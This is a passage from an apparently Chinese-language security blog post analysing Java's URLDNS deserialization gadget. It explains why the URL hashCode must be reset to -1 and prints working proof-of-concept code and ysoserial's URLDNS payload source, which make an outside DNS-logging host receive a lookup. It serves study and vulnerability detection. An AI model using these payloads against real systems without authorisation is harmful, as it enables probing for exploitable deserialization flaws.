&lt;/span>&lt;span style="color:#75715e">&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>map&lt;span style="color:#f92672">);&lt;/span>
os&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#75715e">//从文件中反序列化obj对象
&lt;/span>&lt;span style="color:#75715e">&lt;/span> FileInputStream fis &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> FileInputStream&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;object&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
ObjectInputStream ois &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectInputStream&lt;span style="color:#f92672">(&lt;/span>fis&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">//恢复对象
&lt;/span>&lt;span style="color:#75715e">&lt;/span> HashMap map2 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>HashMap&lt;span style="color:#f92672">&amp;lt;&lt;/span>URL&lt;span style="color:#f92672">,&lt;/span>String&lt;span style="color:#f92672">&amp;gt;)&lt;/span>ois&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;finish&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
ois&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>实际测试在从文件中反序列化恢复HashMap对象时不会触发DNS查询，跟进HashMap的readObject，有如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span> i &lt;span style="color:#f92672">&amp;lt;&lt;/span> mappings&lt;span style="color:#f92672">;&lt;/span> i&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
K key &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>K&lt;span style="color:#f92672">)&lt;/span> s&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#a6e22e">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
V value &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>V&lt;span style="color:#f92672">)&lt;/span> s&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
putVal&lt;span style="color:#f92672">(&lt;/span>hash&lt;span style="color:#f92672">(&lt;/span>key&lt;span style="color:#f92672">),&lt;/span> key&lt;span style="color:#f92672">,&lt;/span> value&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>其中对K尝试调用readObject方法反序列化出对应的对象，其会调用到URL类的readObject方法，可以看到URL的readObject方法会尝试读取到hashCode并放入对象的hashCode属性&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">synchronized&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">readObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>java&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">ObjectInputStream&lt;/span> s&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#66d9ef">throws&lt;/span> IOException&lt;span style="color:#f92672">,&lt;/span> ClassNotFoundException &lt;span style="color:#f92672">{&lt;/span>
GetField gf &lt;span style="color:#f92672">=&lt;/span> s&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">readFields&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
String protocol &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">)&lt;/span>gf&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;protocol&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>getURLStreamHandler&lt;span style="color:#f92672">(&lt;/span>protocol&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> IOException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;unknown protocol: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> protocol&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
String host &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">)&lt;/span>gf&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;host&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> port &lt;span style="color:#f92672">=&lt;/span> gf&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;port&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1&lt;span style="color:#f92672">);&lt;/span>
String authority &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">)&lt;/span>gf&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;authority&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
String file &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">)&lt;/span>gf&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;file&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
String ref &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">)&lt;/span>gf&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;ref&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> hashCode &lt;span style="color:#f92672">=&lt;/span> gf&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;hashCode&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>authority &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>
&lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">((&lt;/span>host &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#f92672">!&lt;/span>host&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isEmpty&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">||&lt;/span> port &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>host &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
host &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
authority &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>port &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span> host &lt;span style="color:#f92672">:&lt;/span> host &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> port&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
tempState &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> UrlDeserializedState&lt;span style="color:#f92672">(&lt;/span>protocol&lt;span style="color:#f92672">,&lt;/span> host&lt;span style="color:#f92672">,&lt;/span> port&lt;span style="color:#f92672">,&lt;/span> authority&lt;span style="color:#f92672">,&lt;/span>
file&lt;span style="color:#f92672">,&lt;/span> ref&lt;span style="color:#f92672">,&lt;/span> hashCode&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>而在序列化时，会调用HashMap.put方法，put方法会跟前面一样，调用hash方法计算hashCode，并放到对象内，序列化时hashCode就被保存了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#66d9ef">public&lt;/span> V &lt;span style="color:#a6e22e">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>K key&lt;span style="color:#f92672">,&lt;/span> V value&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> putVal&lt;span style="color:#f92672">(&lt;/span>hash&lt;span style="color:#f92672">(&lt;/span>key&lt;span style="color:#f92672">),&lt;/span> key&lt;span style="color:#f92672">,&lt;/span> value&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>使得在调用URL.readObject方法时能够获取到hashCode，不会进行DNS解析。要解决这个问题就得让序列化后的数据hashCode为-1才能让hashCode方法调用到getHostAddress方法。
容易想到两种办法&lt;/p>
&lt;ol>
&lt;li>在put后，修改数据，把hashCode对应的数据置为-1，而后进行序列化&lt;/li>
&lt;li>在数据放入HashMap时，通过反射直接调用putVal并把第一个参数设为-1
以下是两种办法的实现，
&lt;a href="https://su18.org/post/ysoserial-su18-1/?#%E5%9B%9B-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-gadget-%E5%88%86%E6%9E%90" target="_blank">来源于&lt;/a>&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">URLDNS&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> Exception &lt;span style="color:#f92672">{&lt;/span>
HashMap&lt;span style="color:#f92672">&amp;lt;&lt;/span>URL&lt;span style="color:#f92672">,&lt;/span> Integer&lt;span style="color:#f92672">&amp;gt;&lt;/span> hashMap &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashMap&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
URL url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> URL&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://su18.dnslog.cn&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
Field f &lt;span style="color:#f92672">=&lt;/span> Class&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;java.net.URL&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;hashCode&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
f&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
f&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>url&lt;span style="color:#f92672">,&lt;/span> 0x01010101&lt;span style="color:#f92672">);&lt;/span>
hashMap&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>url&lt;span style="color:#f92672">,&lt;/span> 0&lt;span style="color:#f92672">);&lt;/span>
f&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>url&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1&lt;span style="color:#f92672">);&lt;/span>
ObjectOutputStream oos &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectOutputStream&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> FileOutputStream&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;urldns.bin&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
oos&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>hashMap&lt;span style="color:#f92672">);&lt;/span>
ObjectInputStream ois &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectInputStream&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> FileInputStream&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;urldns.bin&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
ois&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">URLDNS2&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> Exception &lt;span style="color:#f92672">{&lt;/span>
HashMap&lt;span style="color:#f92672">&amp;lt;&lt;/span>URL&lt;span style="color:#f92672">,&lt;/span> Integer&lt;span style="color:#f92672">&amp;gt;&lt;/span> hashMap &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashMap&lt;span style="color:#f92672">&amp;lt;&amp;gt;();&lt;/span>
URL url &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> URL&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://su18.dnslog.cn&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
Method&lt;span style="color:#f92672">[]&lt;/span> m &lt;span style="color:#f92672">=&lt;/span> Class&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;java.util.HashMap&amp;#34;&lt;/span>&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">getDeclaredMethods&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Method method &lt;span style="color:#f92672">:&lt;/span> m&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>method&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getName&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;putVal&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
method&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
method&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>hashMap&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1&lt;span style="color:#f92672">,&lt;/span> url&lt;span style="color:#f92672">,&lt;/span> 0&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
ObjectOutputStream oos &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectOutputStream&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> FileOutputStream&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;urldns2.bin&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
oos&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>hashMap&lt;span style="color:#f92672">);&lt;/span>
ObjectInputStream ois &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ObjectInputStream&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">new&lt;/span> FileInputStream&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;urldns2.bin&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
ois&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="ysoserial-实现url-dns">ysoserial 实现URL DNS&lt;/h4>
&lt;p>下载
&lt;a href="https://github.com/frohoff/ysoserial" target="_blank">源码&lt;/a>,URLDNS实现如下，很明显采用的时第一种方法，在put之后，通过反射修改对应的值。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">URLDNS&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> ObjectPayload&lt;span style="color:#f92672">&amp;lt;&lt;/span>Object&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> Object &lt;span style="color:#a6e22e">getObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">final&lt;/span> String url&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> Exception &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">//Avoid DNS resolution during payload creation
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">//Since the field &amp;lt;code&amp;gt;java.net.URL.handler&amp;lt;/code&amp;gt; is transient, it will not be part of the serialized payload.
&lt;/span>&lt;span style="color:#75715e">&lt;/span> URLStreamHandler handler &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> SilentURLStreamHandler&lt;span style="color:#f92672">();&lt;/span>
HashMap ht &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashMap&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// HashMap that will contain the URL
&lt;/span>&lt;span style="color:#75715e">&lt;/span> URL u &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> URL&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> url&lt;span style="color:#f92672">,&lt;/span> handler&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// URL to use as the Key
&lt;/span>&lt;span style="color:#75715e">&lt;/span> ht&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>u&lt;span style="color:#f92672">,&lt;/span> url&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
Reflections&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>u&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;hashCode&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// During the put above, the URL&amp;#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> ht&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">final&lt;/span> String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> Exception &lt;span style="color:#f92672">{&lt;/span>
PayloadRunner&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">run&lt;/span>&lt;span style="color:#f92672">(&lt;/span>URLDNS&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> args&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * &amp;lt;p&amp;gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
&lt;/span>&lt;span style="color:#75715e"> * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
&lt;/span>&lt;span style="color:#75715e"> * using the serialized object.&amp;lt;/p&amp;gt;
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * &amp;lt;b&amp;gt;Potential false negative:&amp;lt;/b&amp;gt;
&lt;/span>&lt;span style="color:#75715e"> * &amp;lt;p&amp;gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
&lt;/span>&lt;span style="color:#75715e"> * second resolution.&amp;lt;/p&amp;gt;
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SilentURLStreamHandler&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> URLStreamHandler &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">protected&lt;/span> URLConnection &lt;span style="color:#a6e22e">openConnection&lt;/span>&lt;span style="color:#f92672">(&lt;/span>URL u&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> IOException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">synchronized&lt;/span> InetAddress &lt;span style="color:#a6e22e">getHostAddress&lt;/span>&lt;span style="color:#f92672">(&lt;/span>URL u&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
